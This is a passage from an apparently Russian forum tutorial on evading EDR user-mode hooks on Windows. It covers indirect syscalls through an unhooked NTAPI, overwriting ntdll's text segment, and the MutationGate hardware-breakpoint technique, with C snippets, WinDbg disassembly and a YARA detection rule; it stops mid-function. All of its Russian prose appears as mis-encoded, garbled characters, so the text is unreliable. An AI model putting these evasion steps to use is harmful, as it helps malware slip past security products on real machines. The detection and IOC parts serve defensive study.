–ö–æ–Ω–µ—á–Ω–æ, –Ω–∞–º –Ω—É–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π –∞–¥—Ä–µ—Å –¥–ª—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –ü—Ä–µ–¥–ø–æ–ª–∞–≥–∞—è, —á—Ç–æ NTAPI –Ω–µ –∑–∞—Ö—É–∫–ª–µ–Ω, –º—ã –º–æ–∂–µ–º –ø–æ–ª—É—á–∏—Ç—å –Ω–æ–º–µ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –ø–æ —Å–º–µ—â–µ–Ω–∏—é 0x4 –æ—Ç –Ω–∞—á–∞–ª–∞ —Ñ—É–Ω–∫—Ü–∏–∏, –∞ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –ø–æ —Å–º–µ—â–µ–Ω–∏—é 0x12.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746798016285.png"
		data-src="https://osint42.org/attachments/1746798016285-png.360/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798016285-png.360/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798016285.png"
			title="1746798016285.png"
			width="600" height="90" loading="lazy" />
	</div><br />
<br />
–û–¥–Ω–∞–∫–æ —ç—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –Ω–∞—Å –∫ –ø—Ä–æ–±–ª–µ–º–µ &quot;—á—Ç–æ –±—ã–ª–æ –ø–µ—Ä–≤—ã–º: –∫—É—Ä–∏—Ü–∞ –∏–ª–∏ —è–π—Ü–æ&quot;. –ï—Å–ª–∏ NTAPI –∑–∞—Ö—É–∫–ª–µ–Ω,<b><u> —Ç–æ –µ–≥–æ –∑–∞–≥–ª—É—à–∫–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –Ω–µ –±—É–¥–µ—Ç —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å —à–∞–±–ª–æ–Ω—É –∑–∞–≥–ª—É—à–∫–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞</u></b>, –∏, –µ—Å—Ç–µ—Å—Ç–≤–µ–Ω–Ω–æ, –º—ã –Ω–µ —Å–º–æ–∂–µ–º —É—Å–ø–µ—à–Ω–æ –∏–∑–≤–ª–µ—á—å SSN –∏ –∞–¥—Ä–µ—Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />
–ö —Å—á–∞—Å—Ç—å—é, —É—á–∏—Ç—ã–≤–∞—è, —á—Ç–æ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ (syscall) —è–≤–ª—è–µ—Ç—Å—è –æ—Å–æ–±—ã–º —Ç–∏–ø–æ–º –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –≤—ã–∑–æ–≤–∞, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞–ø—Ä—è–º—É—é –∞–¥—Ä–µ—Å –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞, –∞ –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç –∞–¥—Ä–µ—Å –≤ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ —è–¥—Ä–∞ –Ω–∞ –æ—Å–Ω–æ–≤–µ SSN, –≤—Å–µ, —á—Ç–æ –Ω–∞–º –Ω—É–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, —ç—Ç–æ —É–∫–∞–∑–∞—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π SSN –∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />
–ü–æ—ç—Ç–æ–º—É –Ω–∞–º –Ω–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –ø–æ–ª—É—á–∞—Ç—å –∞–¥—Ä–µ—Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤ —Ñ—É–Ω–∫—Ü–∏–∏ NtAllocateVirtualMemory. –ú—ã –º–æ–∂–µ–º –≤—ã–±—Ä–∞—Ç—å –Ω–µ–∑–∞—Ö—É–∫–ª–µ–Ω–Ω—ã–π NTAPI, —Ç–æ—Ç, –∫–æ—Ç–æ—Ä—ã–π –æ–±—ã—á–Ω–æ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–º –ü–û, –Ω–∞–ø—Ä–∏–º–µ—Ä, NtDrawText.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746798024343.png"
		data-src="https://osint42.org/attachments/1746798024343-png.361/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798024343-png.361/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798024343.png"
			title="1746798024343.png"
			width="938" height="203" loading="lazy" />
	</div><br />
<br />
–•–æ—Ç—è –∫–æ—Å–≤–µ–Ω–Ω—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã —É–ª—É—á—à–∏–ª–∏ —É–∫–ª–æ–Ω–µ–Ω–∏–µ, –ø—Ä–æ–¥—É–∫—Ç—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤—Å–µ –µ—â–µ –º–æ–≥—É—Ç –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –∏—Ö –Ω–∞ –æ—Å–Ω–æ–≤–µ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–æ–≤ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ (IOCs):<br />
–ï—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Syswhisper3 –±–µ–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π, —Ö–æ—Ç—è –∂–µ—Å—Ç–∫–æ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –±–∞–π—Ç–æ–≤ –∑–∞–≥–ª—É—à–∫–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –º–µ–Ω—å—à–µ, –≤—Å–µ —Ä–∞–≤–Ω–æ –≤–æ–∑–º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ —à–∞–±–ª–æ–Ω –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –±–∞–π—Ç–æ–≤: 4c8bd1 41ff&lt;DWORD&gt; c3<br />
<br />
–í–æ–∑–º–æ–∂–Ω–æ–µ –ø—Ä–∞–≤–∏–ª–æ Yara –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>rule syswhisper3
{
    meta:
        description = &quot;Hunt for syswhispe3 generated asm code&quot;

    strings:
        $s1 = {48 89 4c 24 08 48 89 54 24 10 4c 89 44 24 18 4c 89 4c 24 20 48 83 ec 28 b9 ?? ?? ?? ?? e8}
        $s2 = {48 83 c4 28 48 8b 4c 24 08 48 8b 54 24 10 4c 8b 44 24 18 4c 8b 4c 24 20 4c 8b d1}
    condition:
        #s1 &gt;=1 or #s2 &gt;=1
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746798032623.png"
		data-src="https://osint42.org/attachments/1746798032623-png.362/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746798032623-png.362/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746798032623.png"
			title="1746798032623.png"
			width="1368" height="401" loading="lazy" />
	</div><br />
<br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, —Ö–æ—Ç—è —Å—Ç–µ–∫ –≤—ã–∑–æ–≤–æ–≤ –≤—ã–≥–ª—è–¥–∏—Ç –±–æ–ª–µ–µ –ª–µ–≥–∏—Ç–∏–º–Ω—ã–º, –ø—Ä–∞–≤–∏–ª–æ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –º–æ–∂–µ—Ç –æ—Å–Ω–æ–≤—ã–≤–∞—Ç—å—Å—è –Ω–∞ —Ç–æ–º —Ñ–∞–∫—Ç–µ, —á—Ç–æ –∞–¥—Ä–µ—Å –≤–æ–∑–≤—Ä–∞—Ç–∞ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ñ—É–Ω–∫—Ü–∏–∏ NtDrawText, –≤ —Ç–æ –≤—Ä–µ–º—è –∫–∞–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—ã–π —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ ‚Äî —ç—Ç–æ ntoskrnl!NtAllocateVirtualMemory.<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-perezapis-tekstovogo-segmenta-zagruzhennogo-ntdll"></a>–ü–µ—Ä–µ–∑–∞–ø–∏—Å—å —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Å–µ–≥–º–µ–Ω—Ç–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–≥–æ NTDLL&#8203;<a class="hoverLink" href="#-perezapis-tekstovogo-segmenta-zagruzhennogo-ntdll" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>EDR –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ NTAPI, –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞—è –∫–æ–¥ –≤ —Ç–µ–∫—Å—Ç–æ–≤–æ–º —Å–µ–≥–º–µ–Ω—Ç–µ –º–æ–¥—É–ª—è ntdll. –ü–æ—ç—Ç–æ–º—É, —á—Ç–æ–±—ã –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏, –º—ã –º–æ–∂–µ–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Å–µ–≥–º–µ–Ω—Ç –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–≥–æ ntdll.<br />
–î–ª—è –¥–æ—Å—Ç–∏–∂–µ–Ω–∏—è —ç—Ç–æ–≥–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —à–∞–≥–æ–≤:<br />
<ol>
<li data-xf-list-type="ol">–ü—Ä–æ—á–∏—Ç–∞—Ç—å —Å–≤–µ–∂—É—é –∫–æ–ø–∏—é ntdll. –ú—ã –º–æ–∂–µ–º –ø—Ä–æ—á–∏—Ç–∞—Ç—å –µ—ë —Å –¥–∏—Å–∫–∞, —á–µ—Ä–µ–∑ –ò–Ω—Ç–µ—Ä–Ω–µ—Ç, –∏–∑ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ KnownDLL –∏ —Ç.–¥.</li>
<li data-xf-list-type="ol">–ò–∑–º–µ–Ω–∏—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã —Å RX –Ω–∞ RWX, —Ç–∞–∫ –∫–∞–∫ —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Å–µ–≥–º–µ–Ω—Ç –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω –¥–ª—è –∑–∞–ø–∏—Å–∏. –ú—ã —Ç–∞–∫–∂–µ –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å WriteProcessMemory –∏–ª–∏ –µ–≥–æ NTAPI –¥–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω–æ–≥–æ –∫–æ–¥–∞.</li>
<li data-xf-list-type="ol">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Å–µ–≥–º–µ–Ω—Ç –∏–∑ —Å–≤–µ–∂–µ–π –∫–æ–ø–∏–∏ –≤ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–π –º–æ–¥—É–ª—å.</li>
<li data-xf-list-type="ol">–í–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã.</li>
</ol>–û–¥–Ω–∞–∫–æ, —É —ç—Ç–æ–≥–æ –ø–æ–¥—Ö–æ–¥–∞ –µ—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–æ–≤ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ (IOCs):<br />
<ul>
<li data-xf-list-type="ul">EDR –º–æ–∂–µ—Ç –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å, —á—Ç–æ —Ö—É–∫ –±—ã–ª –∏–∑–º–µ–Ω–µ–Ω, –ø—Ä–æ–≤–µ—Ä—è—è —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç—å –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–≥–æ –º–æ–¥—É–ª—è NTDLL.</li>
<li data-xf-list-type="ul">–ú—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤—ã—à–µ—É–∫–∞–∑–∞–Ω–Ω—ã—Ö –¥–µ–π—Å—Ç–≤–∏–π, —á—Ç–æ –º–æ–∂–µ—Ç –≤—ã–∑–≤–∞—Ç—å —Å—Ä–∞–±–∞—Ç—ã–≤–∞–Ω–∏–µ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–π.</li>
<li data-xf-list-type="ul">–û–±–ª–∞—Å—Ç—å –ø–∞–º—è—Ç–∏ —Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ–º RWX —è–≤–ª—è–µ—Ç—Å—è —Å–µ—Ä—å–µ–∑–Ω—ã–º —Å–∏–≥–Ω–∞–ª–æ–º —Ç—Ä–µ–≤–æ–≥–∏.</li>
</ul><h3 class="bbHeading"><a class="u-anchorTarget" name="-perezapis-perekhvachennykh-funktsii"></a>–ü–µ—Ä–µ–∑–∞–ø–∏—Å—å –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π&#8203;<a class="hoverLink" href="#-perezapis-perekhvachennykh-funktsii" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>–í–º–µ—Å—Ç–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏ –≤—Å–µ–≥–æ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Å–µ–≥–º–µ–Ω—Ç–∞, –º—ã –º–æ–∂–µ–º –≤—ã–±—Ä–∞—Ç—å –ø–µ—Ä–µ–∑–∞–ø–∏—Å—å –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π, –∫–∞–∫ –ø—Ä–∏ –ø–∞—Ç—á–∏–Ω–≥–µ AmsiScanBuffer. –•–æ—Ç—è —ç—Ç–æ –≤–ª–µ—á–µ—Ç –∑–∞ —Å–æ–±–æ–π –º–µ–Ω—å—à–µ –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–º –º–æ–¥—É–ª–µ ntdll, –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä—ã –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∏ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Å–µ–≥–º–µ–Ω—Ç–∞ NTDLL –≤—Å–µ —Ä–∞–≤–Ω–æ –ø—Ä–∏–º–µ–Ω–∏–º—ã –∫ —ç—Ç–æ–º—É –ø–æ–¥—Ö–æ–¥—É.<br />
–°—É—â–µ—Å—Ç–≤—É—é—Ç –∏ –¥—Ä—É–≥–∏–µ –ø–æ–¥—Ö–æ–¥—ã –∫ –æ–±—Ö–æ–¥—É –≤—Å—Ç—Ä–æ–µ–Ω–Ω–æ–≥–æ —Ö—É–∫–∞, –Ω–æ —è –Ω–µ –±—É–¥—É —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å –∏—Ö –≤—Å–µ. –≠—Ç–∞ —Å—Ç–∞—Ç—å—è (<a href="https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/" target="_blank" class="link link--external" rel="noopener">Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams - MDSec</a>) –æ—Ç–ª–∏—á–Ω–æ –æ–±—ä—è—Å–Ω—è–µ—Ç –æ–±—â–∏–µ –ø–æ–¥—Ö–æ–¥—ã.<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-mutationgate"></a>MutationGate&#8203;<a class="hoverLink" href="#-mutationgate" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>MutationGate ‚Äî —ç—Ç–æ –≤–∞—Ä–∏–∞–Ω—Ç –∫–æ—Å–≤–µ–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –Ω–æ–≤—ã–π –ø–æ–¥—Ö–æ–¥ –∫ –æ–±—Ö–æ–¥—É –≤—Å—Ç—Ä–æ–µ–Ω–Ω–æ–≥–æ —Ö—É–∫–∞ EDR, –∏—Å–ø–æ–ª—å–∑—É—é—â–∏–π –∞–ø–ø–∞—Ä–∞—Ç–Ω—É—é —Ç–æ—á–∫—É –æ—Å—Ç–∞–Ω–æ–≤–∞ –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />
MutationGate —Ä–∞–±–æ—Ç–∞–µ—Ç –ø—É—Ç–µ–º –≤—ã–∑–æ–≤–∞ –Ω–µ–∑–∞—Ö—É–∫–ª–µ–Ω–Ω–æ–≥–æ NTAPI –∏ –∑–∞–º–µ–Ω—ã SSN –Ω–µ–∑–∞—Ö—É–∫–ª–µ–Ω–Ω–æ–≥–æ NTAPI –Ω–∞ SSN –∑–∞—Ö—É–∫–ª–µ–Ω–Ω–æ–≥–æ NTAPI.<br />
<br />
–¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –Ω–∞ –∑–∞—Ö—É–∫–ª–µ–Ω–Ω—ã–π NTAPI, –∏ –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π —Ö—É–∫ –º–æ–∂–Ω–æ –æ–±–æ–π—Ç–∏ –±–µ–∑ –∑–∞–≥—Ä—É–∑–∫–∏ –≤—Ç–æ—Ä–æ–≥–æ –º–æ–¥—É–ª—è ntdll –∏–ª–∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è –±–∞–π—Ç–æ–≤ –≤ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ø–∞–º—è—Ç–∏ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–≥–æ ntdll.<br />
<br />
<b>–†–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π –Ω–∞ GitHub: </b><a href="https://github.com/senzee1984/MutationGate" target="_blank" class="link link--external" rel="noopener">GitHub - senzee1984/MutationGate: Use hardware breakpoint to dynamically change SSN in run-time</a>.<br />
<br />
–ö–∞–∫ –º—ã –æ–±—Å—É–∂–¥–∞–ª–∏ —Ä–∞–Ω–µ–µ, EDR —Å–∫–ª–æ–Ω–Ω—ã —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ —Ö—É–∫–∏ –¥–ª—è —Ä–∞–∑–ª–∏—á–Ω—ã—Ö NTAPI, –æ—Å–æ–±–µ–Ω–Ω–æ —Ç–µ—Ö, –∫–æ—Ç–æ—Ä—ã–µ –æ–±—ã—á–Ω–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–º –ü–û, —Ç–∞–∫–∏—Ö –∫–∞–∫ NtAllocateVirtualMemory. –í —Ç–æ –≤—Ä–µ–º—è –∫–∞–∫ –¥—Ä—É–≥–∏–µ NTAPI, –∫–æ—Ç–æ—Ä—ã–µ –æ–±—ã—á–Ω–æ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–º –ü–û, —Ç–∞–∫–∏–µ –∫–∞–∫ NtDrawText, —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ, –Ω–µ –∏–º–µ—é—Ç –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã—Ö —Ö—É–∫–æ–≤. <b>–ú–∞–ª–æ–≤–µ—Ä–æ—è—Ç–Ω–æ, —á—Ç–æ EDR —É—Å—Ç–∞–Ω–æ–≤–∏—Ç –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–µ —Ö—É–∫–∏ –¥–ª—è –≤—Å–µ—Ö NTAPI.</b><br />
<br />
–ü—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ NTAPI NtDrawText –Ω–µ –∑–∞—Ö—É–∫–ª–µ–Ω, –≤ —Ç–æ –≤—Ä–µ–º—è –∫–∞–∫ NTAPI NtQueryInformationProcess –∑–∞—Ö—É–∫–ª–µ–Ω.<br />
<br />
–®–∞–≥–∏ —Å–ª–µ–¥—É—é—â–∏–µ:<br />
<br />
- –ü–æ–ª—É—á–∏—Ç—å –∞–¥—Ä–µ—Å NtDrawText. –≠—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å, –∏—Å–ø–æ–ª—å–∑—É—è –∫–æ–º–±–∏–Ω–∞—Ü–∏—é GetModuleHandle –∏ GetProcAddress –∏–ª–∏ –∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫—É—é —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é —á–µ—Ä–µ–∑ –æ–±—Ö–æ–¥ PEB.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>  pNTDT = GetFuncByHash(ntdll, 0xA1920265);    //NtDrawText hash
  pNTDTOffset_8 = (PVOID)((BYTE*)pNTDT + 0x8);    //Offset 0x8 from NtDrawText</code></pre>
	</div>
</div><br />
- –ü–æ–¥–≥–æ—Ç–æ–≤—å—Ç–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã –¥–ª—è NtQueryInformationProcess.<br />
<br />
- –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –∞–ø–ø–∞—Ä–∞—Ç–Ω—É—é —Ç–æ—á–∫—É –æ—Å—Ç–∞–Ω–æ–≤–∞ –Ω–∞ –∞–¥—Ä–µ—Å–µ NtDrawText+0x8. –ö–æ–≥–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –¥–æ—Å—Ç–∏–≥–Ω–µ—Ç —ç—Ç–æ–≥–æ –∞–¥—Ä–µ—Å–∞, SSN NtDrawText –±—É–¥–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ —Ä–µ–≥–∏—Å—Ç—Ä–µ RAX, –Ω–æ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –µ—â–µ –Ω–µ –±—É–¥–µ—Ç –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–Ω.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>0:000&gt; u 0x00007FFBAD00EB68-8
ntdll!NtDrawText:
00007ffb`ad00eb60 4c8bd1          mov     r10,rcx
00007ffb`ad00eb63 b8dd000000      mov     eax,0DDh
00007ffb`ad00eb68 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffb`ad00eb70 7503            jne     ntdll!NtDrawText+0x15 (00007ffb`ad00eb75)
00007ffb`ad00eb72 0f05            syscall
00007ffb`ad00eb74 c3              ret
00007ffb`ad00eb75 cd2e            int     2Eh
00007ffb`ad00eb77 c3              ret</code></pre>
	</div>
</div><br />
- –ü–æ–ª—É—á–∏—Ç–µ SSN NtQueryInformationProcess. –í–Ω—É—Ç—Ä–∏ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–π –æ–±–Ω–æ–≤–∏—Ç–µ —Ä–µ–≥–∏—Å—Ç—Ä RAX –∑–Ω–∞—á–µ–Ω–∏–µ–º SSN NtQueryInformationProcess. –¢–æ –µ—Å—Ç—å, –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π SSN –±—ã–ª –∑–∞–º–µ–Ω–µ–Ω.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>...&lt;SNIP&gt;...
uint32_t GetSSNByHash(PVOID pe, uint32_t Hash)
{
    PBYTE pBase = (PBYTE)pe;
    PIMAGE_DOS_HEADER    pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS    pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
    IMAGE_OPTIONAL_HEADER    ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;
    DWORD exportdirectory_foa = RvaToFileOffset(pImgNtHdrs, ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
